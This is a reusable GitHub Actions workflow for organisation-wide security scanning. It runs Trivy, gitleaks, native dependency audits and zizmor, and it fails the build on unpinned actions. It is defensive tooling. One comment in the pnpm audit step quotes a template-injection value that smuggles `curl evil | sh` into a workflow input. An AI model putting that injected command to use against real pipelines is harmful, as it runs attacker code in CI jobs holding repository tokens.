# Reusable security-scan workflow (Sec-Audit A2 / signals-dpg#300)
#
# Home: commit this to the org `.github` repo at
#   .github/workflows/security-scan.yml
# then call it from each repo with a thin caller (see CALLERS.md).
#
# What it does (all findings upload as SARIF -> the calling repo's Security tab):
#   * Trivy `fs`  — dependency CVEs (walks every lockfile: pnpm-lock/uv.lock/etc.),
#                   IaC/Dockerfile misconfig, and filesystem secret detection.
#   * Native audit (belt-and-suspenders, report-only text): `pnpm audit` (ts) /
#                   `uv-secure` (python, reads uv.lock directly). Trivy is the
#                   SARIF source; this just surfaces advisories Trivy's DB may lag on.
#   * Trivy `image` — per-image CVE scan for any refs passed in `image-refs`.
#   * gitleaks (optional) — git-history/diff secret scan via the OSS image
#                   (no marketplace-action org licence needed).
#   * zizmor       — GitHub-Actions-specific static analysis of the CALLER's own
#                   workflows: unpinned `uses:`, template injection into `run:`,
#                   over-broad `permissions:`, credential persistence. Findings
#                   upload as SARIF like everything else, but ONE class is
#                   blocking regardless of `block:` — see below.
#
# NOT here: CodeQL. Enable it once per repo via *default setup* instead —
#   gh api -X PUT repos/Blue-Dots-Economy/<repo>/code-scanning/default-setup \
#     -f state=configured -f query_suite=default
# (covers TS + Python, auto-uploads SARIF, zero workflow to maintain).
#
# Failure policy: `block: false` (default) = report-only, never fails the build
# (Phase A: populate the triage backlog). Flip to `block: true` after Phase-B
# triage to fail on HIGH/CRITICAL.
#
# EXCEPTION — action pinning is always blocking (#154). Everything else here
# reports and lets you triage later; pinning does not get that grace, because
# report-only is precisely what failed. Sonar already flagged unpinned actions
# after the fact, and signals-search#120 still added two unpinned
# `docker/login-action@v4` steps in parallel with signals-search#133 removing
# six — caught only because the two PRs happened to be reviewed together. A
# non-blocking pin check decays back to that by design.
#
# POLICY DECISION (#154): GitHub-owned actions are pinned too. zizmor's default
# `unpinned-uses` policy already requires a hash for every `uses:`, including
# `actions/*` and `github/*`, and we keep that default rather than relaxing it.
# The usual argument for exempting them is that GitHub controls the namespace —
# but they still execute in jobs holding GITHUB_TOKEN and SONAR_TOKEN, a tag is
# still mutable, and Dependabot maintains SHA pins fine (it reads the trailing
# `# vX.Y.Z` comment and bumps both together). The exemption buys nothing and
# leaves a residual, so there isn't one.

on:
  workflow_call:
    inputs:
      language:
        description: "ts | python | iac | none — selects the native audit step"
        type: string
        default: "ts"
      node-version:
        description: "Node version for `pnpm audit` (ts repos)"
        type: string
        default: "24"
      audit-level:
        description: "pnpm audit threshold (low|moderate|high|critical)"
        type: string
        default: "high"
      image-refs:
        description: 'JSON array of image refs to pull + scan, e.g. ''["ghcr.io/org/api:sha-abc","ghcr.io/org/ui:sha-abc"]''. Empty = skip image scan.'
        type: string
        default: ""
      registry:
        description: "Registry to log into for image-refs pulls"
        type: string
        default: "ghcr.io"
      run-gitleaks:
        description: "Run the gitleaks git-secret scan"
        type: boolean
        default: false
      block:
        description: "true = fail the build on HIGH/CRITICAL; false = report-only"
        type: boolean
        default: false

permissions:
  contents: read
  security-events: write   # required to upload SARIF to code-scanning
  packages: read           # required to pull image-refs from GHCR

jobs:
  # ── Dependencies + IaC misconfig + filesystem secrets (the workhorse) ──────
  trivy-fs:
    name: trivy-fs (deps + misconfig + secrets)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with: { fetch-depth: 0 }

      - name: Trivy filesystem scan
        # Ref is pinned literally, NOT taken from an input: GitHub resolves a step's
        # `uses:` before the job starts, so no `${{ }}` context is available here.
        # Bump this line to upgrade; Dependabot's `github-actions` ecosystem will
        # open the PRs for new releases once it's enabled on this repo.
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          scan-type: fs
          scanners: vuln,misconfig,secret
          format: sarif
          output: trivy-fs.sarif
          # Report-only: capture everything, never fail. Block mode: fail on H/C.
          severity: ${{ inputs.block && 'HIGH,CRITICAL' || 'UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL' }}
          exit-code: ${{ inputs.block && '1' || '0' }}
          ignore-unfixed: false

      - name: Upload Trivy fs SARIF
        if: always()   # still publish findings even when block mode fails the step
        uses: github/codeql-action/upload-sarif@42947a340483f03ba47bb1a039b2c519aab3df85 # v3
        with:
          sarif_file: trivy-fs.sarif
          category: trivy-fs

  # ── Native dependency audit (report-only, no SARIF) ────────────────────────
  deps-audit:
    name: deps-audit (${{ inputs.language }})
    if: inputs.language == 'ts' || inputs.language == 'python'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      # TypeScript: pnpm audit reads the lockfile (no install needed).
      - name: Setup Node + pnpm
        if: inputs.language == 'ts'
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with: { node-version: "${{ inputs.node-version }}" }
      - name: pnpm audit
        if: inputs.language == 'ts'
        # The input goes through `env`, not straight into the `run:` body. A
        # `${{ }}` expansion inside `run:` is substituted textually before the
        # shell sees it, so a caller passing `high"; curl evil | sh; "` would be
        # executing code here, not selecting an audit level (zizmor
        # template-injection).
        env:
          AUDIT_LEVEL: ${{ inputs.audit-level }}
        run: |
          corepack enable
          # Report-only regardless of `block`: Trivy is the gate; this is signal.
          pnpm audit --audit-level="$AUDIT_LEVEL" || \
            echo "::warning::pnpm audit reported advisories (see log; Trivy fs is the SARIF gate)"

      # Python (uv): audit uv.lock DIRECTLY — no requirements-export shim.
      # uv-secure reads uv.lock natively and, given multiple lockfiles, covers
      # the whole multi-package layout (ai-diffusion = 12 uv packages) in one call.
      - name: Setup uv
        if: inputs.language == 'python'
        uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2
      - name: uv-secure (uv.lock audit)
        if: inputs.language == 'python'
        run: |
          # Every uv.lock in the tree; uv-secure is uv-native (reads the lock, not a pip export).
          LOCKS="$(git ls-files 'uv.lock' '**/uv.lock')"
          uvx uv-secure $LOCKS || \
            echo "::warning::uv-secure reported advisories (Trivy fs, which also reads uv.lock, is the SARIF gate)"

  # ── Container image scan (only if image-refs provided) ─────────────────────
  image-scan:
    name: trivy-image
    if: inputs.image-refs != ''
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        image: ${{ fromJSON(inputs.image-refs) }}
    steps:
      - name: Log in to registry
        uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
        with:
          registry: ${{ inputs.registry }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Trivy image scan
        # Ref is pinned literally, NOT taken from an input: GitHub resolves a step's
        # `uses:` before the job starts, so no `${{ }}` context is available here.
        # Bump this line to upgrade; Dependabot's `github-actions` ecosystem will
        # open the PRs for new releases once it's enabled on this repo.
        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
        with:
          scan-type: image
          image-ref: ${{ matrix.image }}
          format: sarif
          output: trivy-image.sarif
          severity: ${{ inputs.block && 'HIGH,CRITICAL' || 'UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL' }}
          exit-code: ${{ inputs.block && '1' || '0' }}

      - name: Upload Trivy image SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@42947a340483f03ba47bb1a039b2c519aab3df85 # v3
        with:
          sarif_file: trivy-image.sarif
          # Distinct category per image so alerts don't overwrite each other.
          category: trivy-image-${{ strategy.job-index }}

  # ── Git secret scan (optional; complements native GitHub secret scanning) ──
  gitleaks:
    name: gitleaks
    if: inputs.run-gitleaks
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with: { fetch-depth: 0 }   # full history so gitleaks scans past commits
      - name: gitleaks (OSS image — no marketplace licence)
        run: |
          docker run --rm -v "$PWD:/repo" ghcr.io/gitleaks/gitleaks:latest \
            detect --source=/repo --redact \
            --report-format sarif --report-path /repo/gitleaks.sarif \
            --exit-code ${{ inputs.block && '1' || '0' }} || true
      - name: Upload gitleaks SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@42947a340483f03ba47bb1a039b2c519aab3df85 # v3
        with:
          sarif_file: gitleaks.sarif
          category: gitleaks

  # ── Workflow lint (zizmor) — Actions-specific static analysis ──────────────
  # Runs against the CALLER's checkout, so every repo calling this workflow gets
  # the check with no per-repo file to add or maintain (#154).
  workflow-lint:
    name: zizmor (workflow lint)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0

      # uvx, matching how uv-secure is already run above — no extra marketplace
      # action to trust in a job holding security-events: write.
      - uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2

      - name: zizmor
        env:
          # Enables the online audits (impostor-commit, known-vulnerable-actions).
          # impostor-commit matters here specifically: it catches a SHA that looks
          # pinned but does not belong to the upstream repo's history, which a
          # pin-only check would happily accept.
          GH_TOKEN: ${{ github.token }}
        # zizmor's own version is pinned for the same reason everything else here
        # is. Dependabot does NOT see this line (it is a `run:`, not a `uses:`),
        # so bump it by hand — same convention as the trivy-action refs above.
        #
        # --no-exit-codes: findings must not fail this step; the pinning gate
        #   below decides what blocks, and the SARIF upload has to happen first.
        # --no-config: the gate is deliberately not locally weakenable. A caller
        #   dropping a zizmor.yml that ignores unpinned-uses would silently opt
        #   out of the one check that exists because opting out is the problem.
        run: |
          uvx zizmor@1.29.0 \
            --format=sarif \
            --no-exit-codes \
            --no-config \
            .github > zizmor.sarif

      - name: Upload zizmor SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@42947a340483f03ba47bb1a039b2c519aab3df85 # v3
        with:
          sarif_file: zizmor.sarif
          category: zizmor

      # The blocking half. Scoped to unpinned-uses on purpose: the other audits
      # (artipacked, excessive-permissions, template-injection) are real but need
      # triage, and coupling them to the merge gate would get the whole thing
      # switched off. Pinning is mechanical — there is no legitimate reason for a
      # floating ref, so there is nothing to triage.
      - name: Pinning gate
        run: |
          count=$(jq '[.runs[0].results[] | select(.ruleId == "zizmor/unpinned-uses")] | length' zizmor.sarif)
          if [ "$count" -eq 0 ]; then
            echo "All action references are hash-pinned."
            exit 0
          fi
          jq -r '.runs[0].results[]
                 | select(.ruleId == "zizmor/unpinned-uses")
                 | "::error file=\(.locations[0].physicalLocation.artifactLocation.uri),line=\(.locations[0].physicalLocation.region.startLine)::unpinned action reference - pin it to a full 40-character commit SHA"' \
            zizmor.sarif
          echo "::error::$count unpinned action reference(s). Pin each to a 40-character commit SHA with a trailing version comment, e.g. uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0"
          exit 1
